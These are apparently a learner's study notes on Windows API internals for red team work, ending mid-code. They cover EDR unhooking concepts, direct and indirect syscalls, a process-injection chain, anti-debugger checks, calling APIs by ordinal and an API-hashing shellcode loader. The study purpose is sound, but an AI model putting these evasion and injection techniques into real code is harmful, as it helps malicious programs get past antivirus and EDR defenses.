# 0. Objectives
- [ ] The structure and internals of Win32 and NT APIs.
- [ ] Develop Red Team tools in C++ and Assembly.
- [ ] Advanced Evasion techniques: unhooking, syscall stubs and NTDLL remapping.
- [ ] Interacting with and developing basic Windows kernel drivers.
- [ ] Stealth-oriented offensive techniques.
---
Before going in further I want to understand in my own way the basic idea of the evasion techniques mentioned above as a reference for me later to test my understanding.
- Hooking: It is like a proxy that the AV//EDR does to see whether the action/intent of the program is malicious or not. 
  ![[api hooking.png]]
  This is a scheme that describes how it is done at the low-level. [Further read](https://www.ired.team/offensive-security/defense-evasion/bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis#what-is-hooking) So unhooking is "breaking" that link between the EDR and the syscall and move on further with our attack without being detected.
- Syscall stubs: They are the blocks of Assembly code (maybe not only assembly, we never know) that get executed in the transition between user mode and kernel mode. 
- NTDLL remapping: `NTDLL` is the user-mode face of the Windows kernel. NTDLL remapping is unmapping the current (hooked) version of `ntdll.dll` and mapping a fresh clean copy of it from disk into memory.
---
# 1. Windows API Concepts

`WinAPI` is simply a collection of functions that represent the limit between programs and the Windows OS. They securely :
- Give user-mode apps access to kernel-level features.
- Maintain compatibility between Windows versions.
- Offer abstract direct hardware access.
They come in two categories:
1. User-Mode APIs: functions within `kernel32.dll`, `user32.dll`, `advapi.dll` ..etc
2. Native APIs(NT APIs): Internal syscalls in `ntdll.dll`, prefixed with `Nt*` or `Zw*`
So User Mode calls for APIs and the Kernel Mode implements these APIs.
## API Layers: Win32, NT and Syscalls
I tried to summarize them in a scheme to remember it:
![APIs](../apis.png)

1. Win323 API, which are functions found in kernnel323.dll and user32.dll. It is a "high level" API that calls for, for example, `OpenProcess` function.
2. NT API, which is a low level API found in ntdll.dll, represents a direct wrapper of syscalls. contains functions that start with `Nt` or `Zw`. Follows the previous `OpenProcess` call to call the `NtOpenProcess` function. Its direct contact with syscalls makes it a target for us.
3. Syscalls: The low level interface between NT API and the kernel. Each syscall is identified with its System Service Number (SSN) and gets called with `syscall` or `int2e` instruction for older x86 systems.
 *It is important to note that the syscall stub for this example is just a placeholder, it is not a real example, not a correct one.* 

## Kernel Prefixes
We've seen `Nt` and `Zw` prefixes, which are prefixes of functions found within `ntdll.dll`. But there is more, of course.
Prefixes are used to showcase to which kernel subsystem the function belongs to. Here is Microsoft's [reference](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/what-does-the-zw-prefix-mean-) on this subject.
To understand this thing more, here is a comparison:

| Nt* Function                              | Zw* Function                                                           |
| ----------------------------------------- | ---------------------------------------------------------------------- |
| Used form user mode.                      | Used in kernel mode.                                                   |
| Uses direct syscalls for system services. | May skip user-mode and some access checks, but calls the same service. |
| Returns raw NTSTATUS codes                | Has the ability to wrap or modify the ret values.                      |
So in short, `Nt*` and `Zw*` functions serve the same purpose, but with different manners.

---

## IAT - Executable side: Demand
A bit long but helpful.
Abbreviation for **Import Address Table**, it is a runtime structure in PE files that contains addresses of functions imported from external DLLs. 
Since it is a runtime structure, it is firstly filled with placeholders. They aren't actually memory addresses of the desired functions, but a "code" that tells the Windows Loaded what is the exactly the external DLL function it needs (for `kernel32.dll`, `user32.dll` ..etc), and only then the Windows Loader takes care of resolving these addresses.

By now, you get the idea: This is a target. This dynamic nature makes me greedy enough to target this structure even though I still know nothing about attacking it. So by hooking IAT we can redirect the valid calls to our malicious calls. 

## EAT - DLL side: Offer
As the PE executable uses the IAT, the DLLs use the **Export Address Table**. It lists all the functions that the DLL offers to other programs.
So, when this DLL is called, the app can use the `getProcAddress()` function or let the Windows Loaded do the job and resolve the function names or [ordinals](#windows-apis-ordinals) declared in the DLL's EAT.

![IAT and EAT](../iat-eat.png)


---

## About Syscalls: SSN-SSDT
### Definition

As previously discussed, they are small functions usually reside in `ntdll.dll` that does the following:
```assembly
mov eax, ssn ; the SSN is user by the kernel to locate the func in the SSDT
mov r10, rcx
syscall -> Jumps into kernel mode
ret ; return to the caller
```
So EDRs hook these stubs and monitor and patch to detect malicious use.
The SSN is the **unique, version-dependant** identifier of each syscall. It tells the kernel which function to invoke from The System Service Dispatch Table (SSDT).
### Direct Syscalls

As the name says, it is bypassing the procedure of calling a function in `ntdll.dll` and call the wanted syscall with a specified syscall stub. 
- Strengths: 
	- This will bypass the hooking the EDRs implement on those Native APIs and get the job done.
- Weaknesses: 
	- Hardcoded SSNs are the weak link as they are very version-dependant. For this there is the [Hell's Gate](https://redops.at/en/blog/exploring-hells-gate) and Halo's Gate methods.
	- `syscall` instructions execute outside of `ntdll.dll` => atypical behaviour.
	- The return addresses after the syscall points back to non-standard memory regions => Can be detected by advanced EDRs.

The implementation is as we specified in [Here](#about-syscalls-ssn-ssdt). 
### Indirect Syscalls
For this, I found ROP gadgets close to this technique. It is jumping directly to a syscall instruction that resides within the ntdll.dll. 
- Strengths:
	- Instead of calling the function in the Native API- which will trigger the hooks- It just call the syscall instruction found in a function in `ntdll.dll`.
	- Executing the syscall instruction will be within a legit call stack => lower detection risk.
- Weaknesses:
	- For EDRs that implement deep stack monitoring and analysis, this method can be detected due to the unusual control flow pattern.
- Implementation:
	- 1. Locate the address of the function within `ntdll.dll`
	- 2. Calculate the offset to the `syscall` instruction.
	- 3. Setup the appropriate registers.
	- 4. Jump to the `syscall` instruction within `ntdll.dll`.
	=> This will assure that the syscall and its return occur within ntdll.dll, which is more expected than the behaviour of the direct syscall method.

---

# 2. Some C++ (ADD POINTER TO FUNCTION)

### Smart Pointers
Unlike raw pointers (`int*` and `char*`), they don't require to manually call `delete`
##### i- `std::unique_ptr` Exclusive ownership

```cpp
#include <iostream>
#include <memory>  // for smart pointers

int main() {
    std::unique_ptr<int> ptr = std::make_unique<int>(42);

    std::cout << "Value: " << *ptr << std::endl;

    // no need to call delete; it auto-deletes when ptr goes out of scope
    return 0;
}

```
The `unique_ptr` object cannot be copied but can be moved and automatically frees the memory when it goes out of scope (RAII).
##### ii- `std::shared_ptr` Reference counting
Makes two pointers reference the same object. This is an important feature  when multiple parts of a the program must share responsibility of an object.

```cpp
#include <iostream>
#include <memory>

void use(std::shared_ptr<int> p) {
    std::cout << "In function: " << *p << std::endl;
}

int main() {
    // smart pointer to in int of value 99
    std::shared_ptr<int> p1 = std::make_shared<int>(99);
    
    // Another smart pointer to the same object of value 99. 
    std::shared_ptr<int> p2 = p1;  // now shared by both

    use(p1);
    std::cout << "Use count: " << p1.use_count() << std::endl;

    return 0;
}
```
### Move semantics `std::move`
Moving object is transferring resources from one object to another without actually copying. This is critical in performance-sensitive applications — like when transferring large buffers or memory blocks.

```cpp
#include <iostream>
#include <string>
#include <utility>  // for std::move

int main() {
    std::string a = "Hello";
    std::string b = std::move(a);  // transfer resources from 'a' to 'b'
	// The std::move does not move the object but mark it as movable. 
    std::cout << "b: " << b << std::endl;
    std::cout << "a (moved-from): " << a << std::endl;

    return 0;
}
```

### Lambda Expressions TO BE EDITED

A **lambda function in C++** is an **anonymous function object** that can be defined **inline**, and can **capture variables** from its surrounding scope. It is useful when we need cleaner code and avoid defining a named function if it's only used once or if we want to define custom behaviour on the fly.
```cpp
[capture](parameters) {
    // function body
};
```
- `capture`: how external variables are captured (by value `[=]` or by reference `[&]`)
    
- `parameters`: like normal function arguments
    
- `return_type`: optional if the compiler can deduce it
    
- `function body`: the code that gets executed

### Callbacks
Callbacks are about deferring execution: you provide a function that another function will call later. They are useful when you want to react to an event and customize the behavior. This makes us able to pass the behavior as an argument. 

```cpp
// Function taking a callback
void performOperation(int a, int b, int (*callback)(int, int)) {
    int result = callback(a, b);
    printf("Result: %d\n", result);
}

// Example callback functions
int add(int x, int y) { return x + y; }
int multiply(int x, int y) { return x * y; }

// Main
int main() {
    performOperation(5, 3, add);       // uses 'add' as callback
    performOperation(5, 3, multiply);  // uses 'multiply' as callback
    return 0;
}
```

### Templates 
**Templates** let you write **generic code** — code that works with **any data type**.
```cpp
#include <iostream>

template <typename T>
T add(T a, T b) {
    return a + b;
}

int main() {
    std::cout << "Sum int: " << add<int>(3, 4) << std::endl;
    std::cout << "Sum double: " << add(2.5, 3.1) << std::endl;
    return 0;
}
```
### Exception handling

```cpp
#include <iostream>
using namespace std;

int main() {
    try { // The sus code that might throw.
        int x = 0;
        if (x == 0)
            throw runtime_error("Division by zero!"); // Signals an exception.

        cout << 10 / x << endl;
    }
    catch (const runtime_error& e) { // Handles the exception.
        cout << "Caught an exception: " << e.what() << endl;
    }

    return 0;
}
```
# 3. Windows API Dev: Interacting with APIs
##### About
In here we'll discover some use cases of the Windows API and try some examples to interact with process using c++.
The `[in]`, `[out]`, and `[optional]` annotations in the next functions' signatures are **metadata comments** used in Microsoft’s documentation (not actual C++ syntax). They describe how each parameter is **used** by the function.
The `[in, out]` marks the parameter as both input and output parameters; The function reads from and writes to It.

The functions, their syntax and these examples are just a way to show how they are used. Of course not to know them by heart.
### 3.1 MessageBoxW 
Displays a Message Box using wide-character strings.
```cpp
// Syntax
int MessageBoxW(
  [in, optional] HWND    hWnd,
  [in, optional] LPCWSTR lpText,
  [in, optional] LPCWSTR lpCaption,
  [in]           UINT    uType // Which bottons and icon to display
);
```
The L prefixed before the specified strings are for wide string literal which marks it as a `wchar_t` array not a simple `char` array.
```cpp
// The following examples are equivalent
L"Testing Display Message";
const wchar_t* lpText = "Testing Display Message";

// The following examples are equivalent
"Testing Display Message";
const char* lpText = "Testing Display Message";
```
Here's a simple example:
```cpp
#include <Windows.h>  // Required for Windows API functions

int main() {
    MessageBoxW(
        NULL,                          // hWnd: No owner window (NULL)
        L"Testing Display Message",         // lpText: The message body
        L"Testing MessageBox Title",      // lpCaption: The title of the window
        MB_OK | MB_ICONINFORMATION     // uType: Button style and icon type
        // The | is used to combine multiple flags into a single value. 
        // Message Button OK and Information Icon
    );
    return 0;
}
```
### 3.2 CreateProcessW
##### About
As specified in the Microsoft's docs:

> Creates a new process and its primary thread. The new process runs in the security context of the calling process. If the calling process is impersonating another user, the new process uses the token for the calling process, not the impersonation token. 
> To run the new process in the security context of the user represented by the impersonation token, use the [CreateProcessAsUser](https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) or [CreateProcessWithLogonW](https://learn.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw) function.
##### Code

```cpp
// Syntax

BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo, // Window visibility
  [out]               LPPROCESS_INFORMATION lpProcessInformation // Returns the process and thread handles + PID.
);
```
Here is a simple example to run `Notepad.exe`. It seems like It's trendy to run notepad.
```cpp
#include <Windows.h>
#include <iostream>

int main() {
	// Setting up the fields values.
	LPCWSTR appName = L"C:\\Windows\\System32\\notepad.exe";  // Program to run
    STARTUPINFOW si = { 0 };           // Startup configuration struct
    PROCESS_INFORMATION pi = { 0 };    // Receives info about the created process
    si.cb = sizeof(si);  // Required: set the size of the structure
    
    // Attempt to create the new process
    BOOL success = CreateProcessW(
        appName,        // Application name
        NULL,           // Command line (optional)
        NULL,           // Process security attributes
        NULL,           // Thread security attributes
        FALSE,          // Inherit handles?
        0,              // Creation flags
        NULL,           // Environment (inherit from parent)
        NULL,           // Current directory (use parent’s)
        &si,            // Pointer to STARTUPINFOW structure
        &pi             // Pointer to PROCESS_INFORMATION structure
    );

    if (success) {
        std::wcout << L"Process created. PID: " << pi.dwProcessId << std::endl;

        // Optionally wait for the process to exit
        WaitForSingleObject(pi.hProcess, INFINITE); //Pauses current thread until the created process exits.

        // Clean up handles
        CloseHandle(pi.hProcess); //Frees OS-level handles — good practice to prevent leaks.
        CloseHandle(pi.hThread);
    } else {
        std::wcerr << L"Failed to create process. Error: " << GetLastError() << std::endl;
    }

    return 0;
}
```

### 3.3 VirtualAlloc
##### About

> Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. Memory allocated by this function is automatically initialized to zero.
> To allocate memory in the address space of another process, use the [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function.

##### Code

```cpp
// Syntax

LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress, //Desired address. Null to let the system decide.
  [in]           SIZE_T dwSize, // Size to allocate.
  [in]           DWORD  flAllocationType, //MEM_COMMIT to allocate physical memory, MEM_RESERVE to just reserve address space not actual physical memory, or both options.
  [in]           DWORD  flProtect // Specify memory protection flags.
);
```
Here the provided example:
```cpp
#include <Windows.h>
#include <iostream>

int main() {
    SIZE_T size = 1024;  // Allocate 1 KB

    LPVOID allocatedMem = VirtualAlloc(
        NULL,                               // Let Windows choose the address
        size,                               // Size of the allocation in bytes
        MEM_COMMIT | MEM_RESERVE,          // Reserve and commit memory
        PAGE_READWRITE                     // Access rights: read + write
    );

    if (allocatedMem) {
        std::cout << "Memory allocated at: " << allocatedMem << std::endl;

        // Free the memory once done
        VirtualFree(allocatedMem, 0, MEM_RELEASE);
    } else {
        std::cerr << "Allocation failed. Error: " << GetLastError() << std::endl;
    }

    return 0;
}
```

### Chaining
Apparently the following functions are important in red team operations, debugging, Malware injection techniques and memory patchers. Here is how the workflow if our execution it typically done:
1. Find the target PID via whatever means necessary.
2. Call the `OpenProcess()` to obtain a handle on this process. 
3. Call `ReadProcessMemory()` to dump memory.
4. Call `VirtualAllocEx` to allocate memory if needed. (optional)
5. Call `WriteProcessMemory` to inject data.
6. Call `CreateRemoteThread` or `NtCreateThreadEx` to execute the shellcode.
### 3.4 OpenProcess
##### About
This function returns us a handle to an already existing process. This grants us the ability to manipulate this process, its threads...etc 
If it fails, we can handle the returned NULL with `GetLastError()` function.
##### Code
```cpp
// Syntax

HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess, // Well, a self explanatory DWORD param. Expects flags.
  [in] BOOL  bInheritHandle, // Can be inherited by later child processes.
  [in] DWORD dwProcessId // PID of the target process.
);
```
The [list](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) of the flags that `dwDesiredAccess` parameter can have is extensive. But here are some that we will need.
- `PROCESS_VM_READ` — needed for `ReadProcessMemory`
- `PROCESS_VM_WRITE` + `PROCESS_VM_OPERATION` — required for `WriteProcessMemory`
- `PROCESS_QUERY_INFORMATION` — often needed in combination
### 3.5 ReadProcessMemory
##### About
Copies data from a memory location in a remote process (another running process) **into your own buffer**. 
**It needs the `PROCESS_VM_READ` access right.**
##### Code
```cpp
BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess, // Handle to the target process. We get this using OpenProcess()
  [in]  LPCVOID lpBaseAddress, // The starting address in the target process's memory where reading begins.
  [out] LPVOID  lpBuffer, // The buffer to hold the copied data.
  [in]  SIZE_T  nSize, // Size of data to copy.
  [out] SIZE_T  *lpNumberOfBytesRead //A pointer to a variable that receives the actual number of bytes read. Useful for verification.
);
```
Same as the last function, if this function fails, we can use the `GetLastError()`.
Points to consider:
- ASLR and DEP may block some reads.
- Heavily monitored by EDRs and Anti-cheat systems.
### 3.6 WriteProcessMemory
##### About
Exactly the same syntax as the [ReadProcessMemory](#35-readprocessmemory) but writes data into the remote process' memory. Just the buffer now holds the data you want to write to the remote's memory. 
**This function requires `PROCESS_VM_WRITE` and `PROCESS_VM_OPERATION` access rights.**
##### Code
```cpp
BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess, // Handle to the target process.
  [in]  LPCVOID lpBaseAddress, // The starting address in the target process's memory where writing begins.
  [in] LPVOID  lpBuffer, // The buffer to hold the data to copy.
  [in]  SIZE_T  nSize, // Size of data to write.
  [out] SIZE_T  *lpNumberOfBytesRead //A pointer to a variable that receives the actual number of bytes to write.
);
```

So to apply the attack chain specified in [Chaining](#chaining) here is a code to Read/Write from/in the current process' memory:
```cpp
#include <Windows.h>
#include <iostream>

int main() {
    // Step 1: Setup a test variable
    int targetValue = 1337;
    std::cout << "[+] Original value: " << targetValue << std::endl;

    // Step 2: Get current process ID
    DWORD pid = GetCurrentProcessId();
    std::cout << "[+] Current PID: " << pid << std::endl;

    // Step 3: Open the process (itself) with read/write access
    HANDLE hProc = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE,
        pid
    );

    if (!hProc) {
        std::cerr << "[-] Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Step 4: Read the value using ReadProcessMemory
    int readBuffer = 0;
    SIZE_T bytesRead = 0;

    if (ReadProcessMemory(hProc, &targetValue, &readBuffer, sizeof(readBuffer), &bytesRead)) {
        std::cout << "[+] ReadProcessMemory: " << readBuffer << " (" << bytesRead << " bytes)" << std::endl;
    } else {
        std::cerr << "[-] Failed to read memory. Error: " << GetLastError() << std::endl;
    }

    // Step 5: Modify the value using WriteProcessMemory
    int newValue = 9000;
    SIZE_T bytesWritten = 0;

    if (WriteProcessMemory(hProc, &targetValue, &newValue, sizeof(newValue), &bytesWritten)) {
        std::cout << "[+] WriteProcessMemory: wrote " << bytesWritten << " bytes" << std::endl;
        std::cout << "[+] New value: " << targetValue << std::endl;
    } else {
        std::cerr << "[-] Failed to write memory. Error: " << GetLastError() << std::endl;
    }

    // Step 6: Cleanup
    CloseHandle(hProc);
    return 0;
}
```

---
### 3.7 NtQueryInformationProcess
##### About
Keep this in mind as it is mentioned in [Microsoft](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess)'s docs:
> **NtQueryInformationProcess** may be altered or unavailable in future versions of Windows. Applications should use the alternate functions listed in this topic.

As the name suggests, this function belong to the Native API, so it's a little closer to the kernel than the previous mentioned functions. It provides internal information about a process: its PPID, Process Environment Block, image name, memory layout...etc.
- **Process Environment Block:** Internal Windows structure that contains a process':
	- Loaded modules (DLLs)
	- Debugging status.
	- Environment variables.
	- Image base address: the starting point of all code and data inside the process and every relative virtual address in the PE file is calculated from this address.
- **Image Name:** is the full file path of the executable or DLL loaded into a process. Example: `C:\Windows\System32\notepad.exe`
##### Code
```cpp

// Syntax

__kernel_entry NTSTATUS NtQueryInformationProcess(
  [in]            HANDLE           ProcessHandle, // Get from OpenProcess()
  [in]            PROCESSINFOCLASS ProcessInformationClass, // Expects special flags to specify which type of information we want.
  [out]           PVOID            ProcessInformation, // Pointer to the strcuture to hold the returned information.
  [in]            ULONG            ProcessInformationLength, // Length of the ProcessInformation variable
  [out, optional] PULONG           ReturnLength // Pointer to the buffer that contains the required buffer size.
);
```
The `__kernel_entry` is  a Microsoft-defined annotation that acts as a compiler hint that doesn't generate real instructions or affect runtime behavior.
Here is a small list of the `ProcessInformationClass`
`NTSTATUS` is a standard 32-bit datatype for status code values. They are used to communicate system information.

| Value                   | Purpose                                            |
| ----------------------- | -------------------------------------------------- |
| ProcessBasicInformation | Basic information + PEB address.                   |
| ProcessImageFileName    | Full path to the executable.                       |
| ProcessDebugPort        | Debugging check.                                   |
| ProcessWow64Information | Check if it's a 32-bit process on a 64-bit system. |
The following example is a basic usage of the `NtQueryInformationProcess`. I spent like few hours understanding the blocks, the purpose of this implementation which was strange to me as a beginner. Here's the thought process:

**Goal:** Retrieve the **PEB** and **PPID** of the current process using `NtQueryInformationProcess`.

First of all, this function has no associated import library, and as specified in Microsoft's documentation we need to go through some run-time dynamic linking and must use `LoadLibrary()` and `GetProcAddress()` functions to resolve it from `Ntdll.dll`. We'll come to this point shortly.

Let's feed the function with the needed arguments.
- **Argument1**: A handle to the target process. So we need to call `OpenProcess()` function which in itself needs the `PID` so we call the `GetCurrentProcessId()`. That's the justification of the first 2 lines into the main function.
- **Arguement2:** `PROCESSINFOCLASS` Flags for the `ProcessInformationClass`. We will be using `ProcessBasicInformation` for our purpose. 
- **Argument3:** There is a twist in here: As specified in Microsoft's docs, if `ProcessBasicInformation` is used, the buffer pointed to by this argument is a bit special and must follow a specific layout:
  ```cpp
		typedef struct _PROCESS_BASIC_INFORMATION {
		    NTSTATUS ExitStatus;
		    PPEB PebBaseAddress;
		    ULONG_PTR AffinityMask;
		    KPRIORITY BasePriority;
		    ULONG_PTR UniqueProcessId;
		    ULONG_PTR InheritedFromUniqueProcessId;
		} PROCESS_BASIC_INFORMATION;
	```
	So this is the layout of the buffer that `ProcessInformation` will point to.
	That's why we defined the custom structure `_MY_PROCESS_BASIC_INFORMATION`
	with minor changes to make it suitable to our goal.
- **Argument4:** Just the size of the pointed-to-buffer, nothing serious.
- **Argument5:**  Just the length of the returned object, nothing serious.

So we're nearly over. We still have one thing: Calling `NtQueryInformationProcess`in the correct manner. We need to go thought `GetProcAddress`, which need a handle to the DLL we want to import the function from and the name of the function we are looking for. So we prepare a function pointer named `NtQueryInformationProcess_t` that has the exact same layout of  `NtQueryInformationProcess`. This will help us in casting the returned address from `GetProcAddress` and we can successfully call it `NtQueryInformationProcess`.

This took me a lot of research and time to understand what is happening and why the fuck is the code structured like that. But worth it, definitely. Here is a small graph:

![NtQueryInfo](../NtQueryInformationProcess.svg)
And here is the final provided code:

```cpp
#include <Windows.h>
#include <winternl.h>
#include <iostream>

// Define a custom struct to avoid conflict with SDK.
typedef struct _MY_PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} MY_PROCESS_BASIC_INFORMATION;

// Function pointer to NtQueryInformationProcess
typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(
    HANDLE,
    PROCESSINFOCLASS,
    PVOID,
    ULONG,
    PULONG
    );

int main() {
    DWORD pid = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

    if (!hProcess) {
        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Resolve NtQueryInformationProcess from ntdll
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    NtQueryInformationProcess_t NtQueryInformationProcess =
        (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        std::cerr << "Could not resolve NtQueryInformationProcess" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    MY_PROCESS_BASIC_INFORMATION pbi = {};
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status == 0) {
        std::cout << "PEB Address: " << pbi.PebBaseAddress << std::endl;
        std::cout << "Parent PID : " << pbi.InheritedFromUniqueProcessId << std::endl;
    }
    else {
        std::cerr << "NtQueryInformationProcess failed. NTSTATUS: 0x" << std::hex << status << std::endl;
    }

    CloseHandle(hProcess);
    return 0;
}
```

By passing the standard APIs we now have successfully retrieved low-level info from a process along with stealthy detection of PP. 

### 3.8 IsDebuggerPresent
Looks into the `BeigDebugged` flag inside the PEB.
```cpp
#include <Windows.h>
#include <iostream>

int main() {
    if (IsDebuggerPresent()) {
        std::cout << "Debugger detected. Exiting..." << std::endl;
        return 1;
    } else {
        std::cout << "No debugger detected. Continuing execution." << std::endl;
    }

    // Proceed with normal execution...
    return 0;
}

```

### 3.9 EumWidows
##### About
This function enumerates all top-level windows and inspects their titles, associated PIDs and even class names. Useful to find debuggers, AV UIs...etc
##### Code
```cpp
BOOL EnumWindows(
  WNDENUMPROC lpEnumFunc,
  LPARAM      lParam
);
```
The following detects if there are some specific debuggers:
```cpp
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>

std::vector<std::wstring> suspiciousTitles = {
    L"OllyDbg", L"x64dbg", L"IDA", L"Immunity Debugger", L"WinDbg"
};

BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
    wchar_t title[256];
    GetWindowTextW(hwnd, title, sizeof(title) / sizeof(wchar_t));

    for (const auto& suspect : suspiciousTitles) {
        if (wcsstr(title, suspect.c_str())) {
            std::wcout << L"[!] Suspicious window found: " << title << std::endl;
        }
    }

    return TRUE;  // continue enumeration
}

int main() {
    EnumWindows(EnumWindowsCallback, 0);
    return 0;
}
```
---
### Windows APIs Ordinals
##### About
Simply, it's a stealthier way to reference functions exported from external APIs. Instead of calling functions by their names which could be detected by static analysers, we call them by their ordinals.
Ordinals are sequential integers assigned by the linked at runtime when compiling a DLL. Later, when using this DLL in our code, we'll extract a given function's ordinals (through a GUI app or with code) and then call functions by their ordinals.
##### Code
```python
# Extract Ordinal
import pefile
import sys

def find_ordinal(dll_path, function_name):
    try:
        pe = pefile.PE(dll_path)
        for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if exp.name.decode() == function_name:
                return exp.ordinal
    except Exception as e:
        print(f"Error: {e}")
    return None

def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py [path_to_dll] [function_name]")
        sys.exit(1)

    dll_path = sys.argv[1]
    function_name = sys.argv[2]

    ordinal = find_ordinal(dll_path, function_name)
    if ordinal is not None:
        print(f"Function '{function_name}' has ordinal: {ordinal} (Decimal)")
    else:
        print(f"Function '{function_name}' not found.")

if __name__ == "__main__":
    main()
```

```cpp
// Call MessageBoxW by its ordinal

#include <windows.h>
#include <iostream>
#include <stdio.h>

int main() {
    // Load user32.dll
    HMODULE hModule = LoadLibrary(L"user32.dll");
    if (!hModule) {
        std::cerr << "Failed to load user32.dll!" << std::endl;
        return 1;
    }

    // Define function pointer type matching MessageBoxA
    typedef int (WINAPI* MsgBoxFunc)(HWND, LPCSTR, LPCSTR, UINT);

    // Resolve function by ordinal (e.g., 2150)
    MsgBoxFunc OrdinalBoxA = (MsgBoxFunc)GetProcAddress(hModule, (LPCSTR)2150);
    if (!OrdinalBoxA) {
        std::cerr << "Failed to locate the function!" << std::endl;
        FreeLibrary(hModule);
        return 1;
    }

    // Call the resolved MessageBoxA function
    OrdinalBoxA(NULL, "Hello, World!", "Test MessageBoxA", MB_OK | MB_ICONINFORMATION);

    // Free the DLL
    FreeLibrary(hModule);
    return 0;
}
```
As we previously went through the tiring process of dissecting the c++ code, everything in the above code should be clear.

--- 
### API Hashing
##### About
Similar concept as API ordinals but a bit different. While we use API ordinals to avoid IAT/string-based detection and resolve function names based on their ordinals at runtime, API hashing gives us the ability to hide clear-text API names and bypass static analysis.
Both concepts serve the same purpose: Evasion.
Here is how this technique works under the hood:
1. Calculate the hash of the function name.  
2. Iterate through the `EAT` of the target DLL and compare the hashes of the function names. 
##### Code
Here is how API Hashing process goes:
1. Calculate the hash of desired API function name.
2. Resolve the DLL containing this function. `kernel32.dll`
3. Resolve the function name by its hash.
4. Allocate executable memory with `VirtualAlloc`.
5. Copy our shellcode to the allocated memory.
6. Start a new thread using `CreateThread` to execute the payload.

```cpp
#include <Windows.h>
#include <iostream>

// Hash function to obfuscate API names
DWORD CalculateHash(const char* functionName) {
    DWORD hash = 0x35;  // seed
    while (*functionName) {
        hash = (hash * 0xAB10F29F) + (*functionName);
        hash &= 0xFFFFFF;  // keep result within 24 bits
        functionName++;
    }
    return hash;
}

// Get the base address of a loaded DLL
HMODULE GetModuleBase(const char* moduleName) {
    return GetModuleHandleA(moduleName);
}

// Resolve an API function by matching a precomputed hash against export names
FARPROC ResolveFunctionByHash(HMODULE hModule, DWORD targetHash) {
    if (!hModule) return nullptr;

    auto dosHeader = (PIMAGE_DOS_HEADER)hModule;
    auto ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);

    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    auto exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);

    DWORD* namesRVA = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* functionName = (const char*)((BYTE*)hModule + namesRVA[i]);
        DWORD hash = CalculateHash(functionName);

        if (hash == targetHash) {
            WORD ordinal = ordinals[i];
            DWORD functionRVA = functions[ordinal];
            return (FARPROC)((BYTE*)hModule + functionRVA);
        }
    }

    return nullptr;
}

// Example shellcode (for demonstration only)
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0,                         // xor rax, rax
    0x48, 0xff, 0xc0,                         // inc rax
    0xc3                                      // ret
};

int main() {
    // Precomputed hashes for the desired APIs
    DWORD hashVirtualAlloc = CalculateHash("VirtualAlloc");
    DWORD hashCreateThread = CalculateHash("CreateThread");
    DWORD hashWaitForSingleObject = CalculateHash("WaitForSingleObject");

    std::cout << "VirtualAlloc hash: 0x" << std::hex << hashVirtualAlloc << std::endl;
    std::cout << "CreateThread hash: 0x" << std::hex << hashCreateThread << std::endl;
    std::cout << "WaitForSingleObject hash: 0x" << std::hex << hashWaitForSingleObject << std::endl;

    // Get kernel32.dll base
    HMODULE hKernel32 = GetModuleBase("kernel32.dll");
    if (!hKernel32) {
        std::cerr << "Failed to get kernel32.dll base address" << std::endl;
        return -1;
    }

    // Resolve APIs by hash
    auto pVirtualAlloc = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))ResolveFunctionByHash(hKernel32, hashVirtualAlloc);
